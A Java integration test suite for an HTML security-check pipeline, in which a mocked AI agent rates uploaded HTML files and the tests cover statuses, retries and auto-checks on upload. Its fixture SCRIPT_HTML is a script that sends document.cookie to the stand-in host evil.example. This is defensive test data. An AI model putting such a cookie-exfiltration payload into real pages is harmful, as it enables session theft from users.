package com.workplace.fileai.security;

import static com.workplace.jooq.Tables.FILE;
import static com.workplace.jooq.Tables.FILE_EXTRACTION;
import static com.workplace.jooq.Tables.FILE_SECURITY_CHECK;
import static com.workplace.jooq.Tables.ISSUE_ATTACHMENT;
import static com.workplace.jooq.Tables.USER;
import static org.assertj.core.api.Assertions.assertThat;
import static org.awaitility.Awaitility.await;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.workplace.auth.service.AssistantResolver;
import com.workplace.auth.service.AssistantSpec;
import com.workplace.chat.service.ChatFixtures;
import com.workplace.file.api.InternalFileCategories;
import com.workplace.file.storage.FileStore;
import com.workplace.fileai.ExtractionProfile;
import com.workplace.fileai.inbound.FileExtractionRequestedEvent;
import com.workplace.fileai.outbound.AiAgentDriveClient;
import com.workplace.fileai.outbound.AiAgentDriveClient.Evidence;
import com.workplace.fileai.outbound.AiAgentDriveClient.SecurityCheckReq;
import com.workplace.fileai.outbound.AiAgentDriveClient.SecurityCheckRes;
import com.workplace.fileai.security.FileSecurityCheckPipeline.Outcome;
import com.workplace.fileai.security.dto.SecurityCheckView;
import com.workplace.global.tenant.TenantContext;
import com.workplace.issue.service.IssueAttachmentService;
import com.workplace.jooq.tables.records.FileSecurityCheckRecord;
import com.workplace.support.ExternalClientMockedTestBase;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.time.OffsetDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.function.Supplier;
import org.jooq.DSLContext;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationEventPublisher;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.transaction.support.TransactionTemplate;
import org.springframework.web.multipart.MultipartFile;

/**
 * HTML 보안 점검 저장·파이프라인·자동 점검 통합 테스트(WP-1262). ai-agent·비서 해석은 목이고, 상태 전이(PENDING→CHECKING→DONE/
 * SKIPPED/FAILED)·재시도·업로드 자동 시작을 실제 DB 로 확인한다. 커밋 뒤 비동기 점검을 보려면 트랜잭션을 실제로 커밋해야 해서 클래스 트랜잭션을 쓰지 않고
 * 만든 행을 직접 지운다.
 */
class FileSecurityCheckPipelineTest extends ExternalClientMockedTestBase {

  private static final long TENANT = 1L;
  private static final String SCRIPT_HTML =
      "<html><body><script>fetch('https://evil.example/c?'+document.cookie)</script></body></html>";
  private static final AssistantSpec SPEC =
      new AssistantSpec(1L, "claude-sonnet-4-6", "NORMAL", 1, 60_000);

  @Autowired DSLContext dsl;
  @Autowired FileStore fileStore;
  @Autowired FileSecurityCheckPipeline pipeline;
  @Autowired FileSecurityCheckService service;
  @Autowired FileSecurityCheckRepository repository;
  @Autowired FileSecurityCheckScheduler scheduler;
  @Autowired IssueAttachmentService issueAttachmentService;
  @Autowired ChatFixtures fx;
  @Autowired ApplicationEventPublisher events;

  @Autowired AiAgentDriveClient driveClient;
  @Autowired AssistantResolver assistantResolver;

  private final List<Long> fileIds = new ArrayList<>();
  private final List<Long> userIds = new ArrayList<>();

  @BeforeEach
  void setUp() {
    when(assistantResolver.resolveWorkspaceOrEmpty()).thenReturn(Optional.of(SPEC));
  }

  @AfterEach
  void cleanup() {
    if (!fileIds.isEmpty()) {
      cleanupInTenant(
          TENANT,
          () -> {
            dsl.deleteFrom(FILE_SECURITY_CHECK)
                .where(FILE_SECURITY_CHECK.FILE_ID.in(fileIds))
                .execute();
            dsl.deleteFrom(FILE_EXTRACTION).where(FILE_EXTRACTION.FILE_ID.in(fileIds)).execute();
            dsl.deleteFrom(ISSUE_ATTACHMENT).where(ISSUE_ATTACHMENT.FILE_ID.in(fileIds)).execute();
            dsl.execute(
                "DELETE FROM worker_job WHERE params ->> 'fileId' IN ("
                    + String.join(",", fileIds.stream().map(id -> "'" + id + "'").toList())
                    + ")");
            dsl.deleteFrom(FILE).where(FILE.ID.in(fileIds)).execute();
          });
      fileIds.clear();
    }
    fx.cleanupAll();
    if (!userIds.isEmpty()) {
      new TransactionTemplate(txManager)
          .executeWithoutResult(s -> dsl.deleteFrom(USER).where(USER.ID.in(userIds)).execute());
      userIds.clear();
    }
    TenantContext.clear();
  }

  /** 스크립트가 든 HTML 을 점검하면 AI 응답(위험도·근거)과 모델·시각을 저장하고 DONE 이 된다. */
  @Test
  void check_whenScriptHtml_storesDoneWithEvidence() {
    stubHigh();
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    pending(fileId);

    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.DONE);

    FileSecurityCheckRecord row = row(fileId);
    assertThat(row.getStatus()).isEqualTo("DONE");
    assertThat(row.getRisk()).isEqualTo("HIGH");
    assertThat(row.getHeadline()).isEqualTo("쿠키를 외부로 보내요");
    assertThat(row.getEvidence().data()).contains("EXTERNAL_REQUEST");
    assertThat(row.getCheckedAt()).isNotNull();
    assertThat(row.getModel()).isEqualTo(SPEC.model());
    // 지금 판정 기준 판을 함께 적는다 — 기준이 바뀌면 이 결과를 낡은 것으로 가른다(WP-1283).
    assertThat(row.getCriteriaVersion()).isEqualTo(FileSecurityCheckRepository.CRITERIA_VERSION);
    SecurityCheckView view = asTenant(() -> service.view(fileId));
    assertThat(view.evidence()).hasSize(1);
    assertThat(view.reason()).isNull();
  }

  /** 스크립트가 없으면 AI 를 부르지 않고 SKIPPED. */
  @Test
  void check_whenNoScripts_skipsWithoutCallingAgent() {
    long fileId = seedFile("plain.html", "text/html", "<p>안녕</p>".getBytes(StandardCharsets.UTF_8));
    pending(fileId);

    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.SKIPPED);

    verify(driveClient, never()).securityCheck(any());
    assertThat(row(fileId).getStatus()).isEqualTo("SKIPPED");
  }

  /** 20MB 를 넘으면 바이트를 읽지 않고(file 행 크기로) FAILED too-large. */
  @Test
  void check_whenOver20Mb_failsTooLarge() {
    long fileId = seedFileRow("big.html", "text/html", 20L * 1024 * 1024 + 1, "x/none-big", null);
    pending(fileId);

    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.FAILED);

    verify(driveClient, never()).securityCheck(any());
    assertThat(row(fileId).getStatus()).isEqualTo("FAILED");
    assertThat(row(fileId).getError()).isEqualTo("too-large");
    assertThat(asTenant(() -> service.view(fileId)).reason()).isEqualTo("TOO_LARGE");
  }

  /** AI 호출이 실패하면 1·2회 뒤엔 PENDING 으로 돌아가 다시 줍고, 3회째에 FAILED. */
  @Test
  void check_whenAgentThrows_retriesThenFails() {
    when(driveClient.securityCheck(any())).thenThrow(new RuntimeException("boom"));
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    pending(fileId);

    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.ATTEMPT_FAILED);
    assertThat(row(fileId).getStatus()).isEqualTo("PENDING");
    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.ATTEMPT_FAILED);
    assertThat(row(fileId).getStatus()).isEqualTo("PENDING");
    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.FAILED);

    verify(driveClient, times(3)).securityCheck(any());
    assertThat(row(fileId).getStatus()).isEqualTo("FAILED");
    assertThat(row(fileId).getAttempts()).isEqualTo(3);
    assertThat(asTenant(() -> service.view(fileId)).reason()).isEqualTo("ERROR");
  }

  /** 저장소에 바이너리가 없으면 재시도 없이 바로 FAILED missing-binary. */
  @Test
  void check_whenBinaryMissing_failsImmediately() {
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    String path = inTenantCall(() -> fileRow(fileId));
    fileStore.deleteIfExists(path);
    pending(fileId);

    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.FAILED);

    verify(driveClient, never()).securityCheck(any());
    assertThat(row(fileId).getStatus()).isEqualTo("FAILED");
    assertThat(row(fileId).getError()).isEqualTo("missing-binary");
    assertThat(row(fileId).getAttempts()).isEqualTo(1);
  }

  /** UTF-8 로 깨진 바이트가 섞여도 스크립트 판정·점검은 그대로 된다. */
  @Test
  void check_whenBrokenUtf8_stillChecks() {
    stubHigh();
    byte[] head = "<html><script>alert(1)</script>".getBytes(StandardCharsets.UTF_8);
    byte[] bytes = new byte[head.length + 3];
    System.arraycopy(head, 0, bytes, 0, head.length);
    bytes[head.length] = (byte) 0xC3;
    bytes[head.length + 1] = (byte) 0x28;
    bytes[head.length + 2] = (byte) 0xFF;
    long fileId = seedFile("broken.html", "text/html", bytes);
    pending(fileId);

    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.DONE);
    assertThat(row(fileId).getStatus()).isEqualTo("DONE");
  }

  /** AI 응답이 비어(null) 오면 시도 실패로 센다(NPE 로 행이 CHECKING 에 남지 않게). */
  @Test
  void check_whenAgentReturnsNull_countsAsAttemptFailure() {
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    pending(fileId);

    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.ATTEMPT_FAILED);
    assertThat(row(fileId).getStatus()).isEqualTo("PENDING");
  }

  /** 메일 경로 — 받은 바이트로 점검하고, 실패하면 스케줄러가 줍지 않으므로 바로 FAILED. */
  @Test
  void checkWithBytes_whenAgentThrows_failsWithoutRetry() {
    when(driveClient.securityCheck(any())).thenThrow(new RuntimeException("boom"));
    long fileId =
        seedFileRow(
            "mail.html", "text/html", 10L, "x/none-mail", InternalFileCategories.MAIL_EXTRACT);
    pending(fileId);

    var prepared = FileSecurityCheckPipeline.prepare(SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    assertThat(asTenant(() -> pipeline.check(fileId, prepared, "mail.html")))
        .isEqualTo(Outcome.FAILED);
    assertThat(row(fileId).getStatus()).isEqualTo("FAILED");
  }

  /** 비서 사양 timeoutMs 가 lease 보다 길어도(20분) ai-agent 호출 timeout 은 8분으로 잘린다 — lease(10분) 안에 끝나게. */
  @Test
  void check_whenSpecTimeoutExceedsCap_capsAgentTimeoutAt8Minutes() {
    when(assistantResolver.resolveWorkspaceOrEmpty())
        .thenReturn(Optional.of(new AssistantSpec(1L, "m", "NORMAL", 1, 20 * 60_000)));
    stubHigh();
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    pending(fileId);

    asTenant(() -> pipeline.check(fileId));

    ArgumentCaptor<SecurityCheckReq> req = ArgumentCaptor.forClass(SecurityCheckReq.class);
    verify(driveClient).securityCheck(req.capture());
    assertThat(req.getValue().timeoutMs()).isEqualTo(8L * 60 * 1000);
    assertThat(FileSecurityCheckRepository.LEASE).isEqualTo(Duration.ofMinutes(10));
  }

  /** 응답 위험도가 고정 값이 아니면 저장하지 않고 재시도 대상 실패로 센다(저장 단계에서 터져 CHECKING 에 남지 않게). */
  @Test
  void check_whenAgentReturnsUnknownRisk_countsAsAttemptFailure() {
    when(driveClient.securityCheck(any()))
        .thenReturn(new SecurityCheckRes("SEVERE", "x", List.of(new Evidence("OTHER", "d"))));
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    pending(fileId);

    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.ATTEMPT_FAILED);
    assertThat(row(fileId).getStatus()).isEqualTo("PENDING");
    assertThat(row(fileId).getAttempts()).isEqualTo(1);
    assertThat(row(fileId).getRisk()).isNull();
  }

  /** 저장소 경로는 내부 카테고리(메일 사본) 행을 선점하지 않는다 — 메일 요청 점검과 다투거나 missing-binary 로 FAILED 가 되지 않게. */
  @Test
  void check_whenInternalCategory_doesNotClaim() {
    long fileId =
        seedFileRow("m.html", "text/html", 10L, "x/none-int", InternalFileCategories.MAIL_EXTRACT);
    pending(fileId);

    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.NOT_CLAIMED);
    assertThat(row(fileId).getStatus()).isEqualTo("PENDING");
    assertThat(row(fileId).getAttempts()).isZero();
  }

  /** UTF-16(BOM) HTML 의 스크립트도 보고 AI 점검까지 간다 — UTF-8 로만 읽으면 SKIPPED 로 빠졌다. */
  @Test
  void check_whenUtf16LeHtmlWithScripts_checksToDone() {
    stubHigh();
    byte[] body = SCRIPT_HTML.getBytes(StandardCharsets.UTF_16LE);
    byte[] bytes = new byte[body.length + 2];
    bytes[0] = (byte) 0xFF;
    bytes[1] = (byte) 0xFE;
    System.arraycopy(body, 0, bytes, 2, body.length);
    long fileId = seedFile("u16.html", "text/html", bytes);
    pending(fileId);

    assertThat(asTenant(() -> pipeline.check(fileId))).isEqualTo(Outcome.DONE);
  }

  /** SKIPPED 를 다시 요청하면 PENDING 으로 되돌려 다시 점검한다(웹이 스크립트를 본 경우 사용자가 요청할 수 있게). */
  @Test
  void request_whenSkipped_resetsToPendingAndChecks() {
    stubHigh();
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    inTenantCall(
        () ->
            dsl.insertInto(FILE_SECURITY_CHECK)
                .set(FILE_SECURITY_CHECK.FILE_ID, fileId)
                .set(FILE_SECURITY_CHECK.STATUS, "SKIPPED")
                .set(FILE_SECURITY_CHECK.ATTEMPTS, 1)
                .execute());

    SecurityCheckView view = asTenant(() -> service.request(fileId));

    assertThat(view.status()).isEqualTo("PENDING");
    await().atMost(Duration.ofSeconds(10)).until(() -> "DONE".equals(row(fileId).getStatus()));
  }

  /** AI 가 없는 워크스페이스는 행이 없어도 reason NO_AI 로 알려 준다. */
  @Test
  void view_whenNoAi_returnsNoAiReason() {
    when(assistantResolver.resolveWorkspaceOrEmpty()).thenReturn(Optional.empty());
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));

    SecurityCheckView view = asTenant(() -> service.view(fileId));

    assertThat(view.status()).isNull();
    assertThat(view.reason()).isEqualTo("NO_AI");
  }

  /** AI 가 없으면 요청해도 행을 만들지 않는다. */
  @Test
  void request_whenNoAi_doesNotCreateRow() {
    when(assistantResolver.resolveWorkspaceOrEmpty()).thenReturn(Optional.empty());
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));

    SecurityCheckView view = asTenant(() -> service.request(fileId));

    assertThat(view.reason()).isEqualTo("NO_AI");
    assertThat(row(fileId)).isNull();
  }

  /** FAILED 를 다시 요청하면 시도 횟수를 비우고 PENDING 으로 돌린 뒤 커밋 뒤 점검해 DONE 이 된다. */
  @Test
  void request_whenFailed_resetsToPending() {
    stubHigh();
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    inTenantCall(
        () ->
            dsl.insertInto(FILE_SECURITY_CHECK)
                .set(FILE_SECURITY_CHECK.FILE_ID, fileId)
                .set(FILE_SECURITY_CHECK.STATUS, "FAILED")
                .set(FILE_SECURITY_CHECK.ATTEMPTS, 3)
                .set(FILE_SECURITY_CHECK.ERROR, "boom")
                .execute());

    SecurityCheckView view = asTenant(() -> service.request(fileId));

    assertThat(view.status()).isEqualTo("PENDING");
    assertThat(view.reason()).isNull();
    await().atMost(Duration.ofSeconds(10)).until(() -> "DONE".equals(row(fileId).getStatus()));
    assertThat(row(fileId).getAttempts()).isEqualTo(1);
    assertThat(row(fileId).getError()).isNull();
  }

  /** 지금 판정 기준의 DONE 은 다시 요청해도 결과를 그대로 둔다(AI 를 다시 부르지 않는다). */
  @Test
  void request_whenDone_keepsResult() {
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    inTenantCall(
        () ->
            dsl.insertInto(FILE_SECURITY_CHECK)
                .set(FILE_SECURITY_CHECK.FILE_ID, fileId)
                .set(FILE_SECURITY_CHECK.STATUS, "DONE")
                .set(FILE_SECURITY_CHECK.RISK, "LOW")
                .set(FILE_SECURITY_CHECK.HEADLINE, "괜찮아요")
                .set(
                    FILE_SECURITY_CHECK.CRITERIA_VERSION,
                    FileSecurityCheckRepository.CRITERIA_VERSION)
                .execute());

    SecurityCheckView view = asTenant(() -> service.request(fileId));

    assertThat(view.status()).isEqualTo("DONE");
    assertThat(view.risk()).isEqualTo("LOW");
    assertThat(view.headline()).isEqualTo("괜찮아요");
    verify(driveClient, never()).securityCheck(any());
  }

  /** 이슈 첨부로 .html(octet-stream)을 올리면 커밋 뒤 점검 행이 생기고 비동기 점검으로 DONE 이 된다. */
  @Test
  void upload_whenHtmlWithScripts_autoCreatesPendingRow() {
    stubHigh();
    TenantContext.set(TENANT);
    ChatFixtures.Setup s = fx.setup();
    List<MultipartFile> files =
        List.of(
            new MockMultipartFile(
                "files",
                "deck.html",
                "application/octet-stream",
                SCRIPT_HTML.getBytes(StandardCharsets.UTF_8)));
    long fileId =
        inTenantCall(
            () ->
                issueAttachmentService
                    .upload(s.reporterId(), s.projectKey(), s.issueNumber(), files)
                    .get(0)
                    .fileId());
    fileIds.add(fileId);

    await()
        .atMost(Duration.ofSeconds(10))
        .until(() -> row(fileId) != null && "DONE".equals(row(fileId).getStatus()));
    assertThat(row(fileId).getRisk()).isEqualTo("HIGH");
  }

  /**
   * 내부 카테고리(메일 사본) 파일은 업로드 이벤트가 와도 점검 행을 만들지 않고 커밋 뒤 점검도 걸지 않는다. 행 생성은 이벤트 처리 안에서 동기로 일어나고 커밋 뒤 점검은
   * 행을 넣었을 때만 걸리므로 기다릴 비동기 작업이 없다.
   */
  @Test
  void upload_whenMailExtractCategory_skipsAutoCheck() {
    long fileId =
        seedFileRow(
            "mail.html",
            "application/octet-stream",
            10L,
            "x/none-mail2",
            InternalFileCategories.MAIL_EXTRACT);

    inTenantCall(
        () -> {
          events.publishEvent(
              FileExtractionRequestedEvent.of(
                  fileId, "application/octet-stream", ExtractionProfile.TEXT_ONLY));
          return null;
        });

    assertThat(row(fileId)).isNull();
    verify(driveClient, never()).securityCheck(any());
  }

  /**
   * 이미 점검 행이 있는 파일에 업로드 이벤트가 다시 오면({@code insertPendingIfAbsent}=false) 커밋 뒤 점검을 걸지 않는다. 행을 PENDING
   * 으로 두고 AI 를 HIGH 로 스텁해, 점검이 걸렸다면 DONE 이 됐을 상황에서 한동안 PENDING·시도 0 이 유지되고 AI 호출이 없는지 본다.
   */
  @Test
  void upload_whenRowAlreadyExists_doesNotScheduleCheck() {
    stubHigh();
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    pending(fileId);

    inTenantCall(
        () -> {
          events.publishEvent(
              FileExtractionRequestedEvent.of(fileId, "text/html", ExtractionProfile.TEXT_ONLY));
          return null;
        });

    await()
        .during(Duration.ofMillis(700))
        .atMost(Duration.ofSeconds(3))
        .until(() -> "PENDING".equals(row(fileId).getStatus()) && row(fileId).getAttempts() == 0);
    verify(driveClient, never()).securityCheck(any());
  }

  /** HTML 이 아닌 octet-stream 업로드(.zip)는 점검 행도 커밋 뒤 점검도 없다 — 예전엔 업로드마다 빈 점검이 돌았다. */
  @Test
  void upload_whenOctetStreamZip_createsNoRowAndNoCheck() {
    TenantContext.set(TENANT);
    ChatFixtures.Setup s = fx.setup();
    List<MultipartFile> files =
        List.of(
            new MockMultipartFile(
                "files", "bundle.zip", "application/octet-stream", new byte[] {80, 75, 3, 4}));
    long fileId =
        inTenantCall(
            () ->
                issueAttachmentService
                    .upload(s.reporterId(), s.projectKey(), s.issueNumber(), files)
                    .get(0)
                    .fileId());
    fileIds.add(fileId);

    assertThat(row(fileId)).isNull();
    verify(driveClient, never()).securityCheck(any());
  }

  /** 재개 수집은 PENDING·lease 만료 CHECKING 만 줍고, 메일 사본(내부 카테고리)과 lease 가 남은 CHECKING 은 뺀다. */
  @Test
  void findResumable_excludesInternalAndActiveLease() {
    long normal = seedFile("a.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    long mail =
        seedFileRow("m.html", "text/html", 10L, "x/none-m", InternalFileCategories.MAIL_EXTRACT);
    long expired = seedFile("b.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    long active = seedFile("c.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    pending(normal);
    pending(mail);
    checking(expired, OffsetDateTime.now().minusMinutes(1));
    checking(active, OffsetDateTime.now().plusMinutes(4));

    List<Long> resumable = inTenantCall(() -> repository.findResumable(1000));

    assertThat(resumable).contains(normal, expired).doesNotContain(mail, active);
  }

  /** 스케줄러가 남은 PENDING 을 주워 실행기에 넘기고, 비동기 점검이 DONE 으로 만든다. */
  @Test
  void scheduler_whenPendingRow_checksToDone() {
    stubHigh();
    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
    pending(fileId);

    scheduler.runOnce();

    await().atMost(Duration.ofSeconds(10)).until(() -> "DONE".equals(row(fileId).getStatus()));
    assertThat(row(fileId).getRisk()).isEqualTo("HIGH");
  }

  // ── 헬퍼 ──────────────────────────────────────────────

  /** AI 가 HIGH·근거 1건을 돌려주게 한다. */
  private void stubHigh() {
    when(driveClient.securityCheck(any()))
        .thenReturn(
            new SecurityCheckRes(
                "HIGH",
                "쿠키를 외부로 보내요",
                List.of(new Evidence("EXTERNAL_REQUEST", "evil.example 로 쿠키 전송"))));
  }

  /** 점검 행을 PENDING 으로 만든다. */
  private void pending(long fileId) {
    inTenantCall(
        () -> {
          repository.insertPendingIfAbsent(fileId);
          return null;
        });
  }

  /** 점검 행을 CHECKING(지정 lease)으로 만든다. */
  private void checking(long fileId, OffsetDateTime leasedUntil) {
    inTenantCall(
        () ->
            dsl.insertInto(FILE_SECURITY_CHECK)
                .set(FILE_SECURITY_CHECK.FILE_ID, fileId)
                .set(FILE_SECURITY_CHECK.STATUS, "CHECKING")
                .set(FILE_SECURITY_CHECK.ATTEMPTS, 1)
                .set(FILE_SECURITY_CHECK.LEASED_UNTIL, leasedUntil)
                .execute());
  }

  /** 바이너리를 저장하고 file 행을 만든다. */
  private long seedFile(String name, String mime, byte[] bytes) {
    String path = "tenant-1/security-test/" + System.nanoTime() + "-" + name;
    fileStore.storeBytes(path, bytes);
    return seedFileRow(name, mime, bytes.length, path, null);
  }

  /** file 행만 만든다(바이너리는 호출자 몫). */
  private long seedFileRow(String name, String mime, long size, String path, String category) {
    String suffix = String.valueOf(System.nanoTime());
    Long userId =
        new TransactionTemplate(txManager)
            .execute(
                s ->
                    dsl.insertInto(USER)
                        .set(USER.USERNAME, "sc-" + suffix)
                        .set(USER.NAME, "SC")
                        .set(USER.EMAIL, "sc-" + suffix + "@example.com")
                        .set(USER.KIND, "HUMAN")
                        .returning(USER.ID)
                        .fetchOne()
                        .getId());
    userIds.add(userId);
    long fileId =
        inTenantCall(
            () ->
                dsl.insertInto(FILE)
                    .set(FILE.ORIGINAL_NAME, name)
                    .set(FILE.STORED_NAME, "s-" + suffix)
                    .set(FILE.MIME_TYPE, mime)
                    .set(FILE.SIZE_BYTES, size)
                    .set(FILE.STORAGE_PATH, path)
                    .set(FILE.CATEGORY, category)
                    .set(FILE.UPLOADED_BY, userId)
                    .returning(FILE.ID)
                    .fetchOne()
                    .getId());
    fileIds.add(fileId);
    return fileId;
  }

  private String fileRow(long fileId) {
    return dsl.select(FILE.STORAGE_PATH)
        .from(FILE)
        .where(FILE.ID.eq(fileId))
        .fetchOne(FILE.STORAGE_PATH);
  }

  private FileSecurityCheckRecord row(long fileId) {
    return inTenantCall(
        () ->
            dsl.selectFrom(FILE_SECURITY_CHECK)
                .where(FILE_SECURITY_CHECK.FILE_ID.eq(fileId))
                .fetchOne());
  }

  /** 테넌트 컨텍스트를 세우고 트랜잭션 안에서 실행한다. */
  private <T> T inTenantCall(Supplier<T> body) {
    TenantContext.set(TENANT);
    try {
      return new TransactionTemplate(txManager).execute(s -> body.get());
    } finally {
      TenantContext.clear();
    }
  }

  /** 트랜잭션 없이 테넌트 컨텍스트만 세운다 — 파이프라인·서비스가 스스로 짧은 트랜잭션을 여는 실제 호출 조건. */
  private <T> T asTenant(Supplier<T> body) {
    TenantContext.set(TENANT);
    try {
      return body.get();
    } finally {
      TenantContext.clear();
    }
  }
}
